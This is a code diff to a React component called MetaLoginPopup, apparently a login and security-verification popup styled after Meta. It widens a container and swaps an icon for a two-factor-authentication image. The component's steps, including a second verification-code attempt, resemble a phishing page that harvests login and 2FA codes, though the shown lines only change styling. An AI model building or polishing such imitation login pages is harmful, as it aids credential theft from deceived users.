@@ -169,7 +169,7 @@ const MetaLoginPopup = () => {
   return (
     <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
       <main className="flex-grow flex items-center justify-center p-4">
-        <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-[480px] border border-gray-200">
+        <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-[580px] border border-gray-200">
           {currentStep === LoginStep.SUCCESS ? (
             <div className="text-center">
               <div className="mx-auto mb-6">
@@ -306,8 +306,12 @@ const MetaLoginPopup = () => {
                 currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                 <>
                   <div className="text-center mb-6">
-                    <div className="h-20 w-20 mx-auto mb-4 flex items-center justify-center bg-blue-100 rounded-full">
-                      <Smartphone className="h-10 w-10 text-blue-600" />
+                    <div className="mx-auto mb-6 flex justify-center">
+                      <img 
+                        src="/assets/two-factor-auth.jpg" 
+                        alt="Two-Factor Authentication" 
+                        className="h-40 object-contain rounded-lg"
+                      />
                     </div>
                     <h3 className="text-2xl font-semibold text-gray-800">Security Verification</h3>
                     <p className="text-gray-600 mt-3 text-sm">
